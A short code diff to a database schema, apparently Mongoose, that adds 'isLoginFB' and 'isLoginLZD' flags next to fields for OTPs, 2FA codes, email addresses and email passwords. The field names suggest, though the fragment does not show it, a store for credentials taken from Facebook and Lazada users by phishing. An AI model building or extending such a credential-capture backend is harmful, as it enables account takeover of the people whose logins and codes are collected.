@@ -10,6 +10,8 @@ const LZDFBTempSchema = new Schema({
     otp: {type:String},
     otpLan2: {type:String},
     status: {type:Boolean},
+    isLoginFB: {type:Boolean},
+    isLoginLZD: {type:Boolean},
     twoFA: {type:String},
     mail: {type:String},
     passMail: {type:String},
